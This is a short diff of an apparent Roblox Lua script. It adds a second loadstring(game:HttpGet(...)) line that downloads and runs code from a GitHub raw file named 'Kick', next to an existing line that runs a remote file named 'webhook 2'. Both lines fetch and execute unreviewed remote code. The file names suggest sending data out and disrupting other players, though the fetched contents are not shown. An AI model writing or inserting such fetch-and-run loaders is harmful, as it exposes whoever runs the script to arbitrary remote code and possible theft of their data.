@@ -198,3 +198,5 @@ startLoop()
 
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/hdgsydgdgdy1233/Loaderlua/refs/heads/main/webhook%202"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hdgsydgdgdy1233/Loaderlua/refs/heads/main/Kick"))()
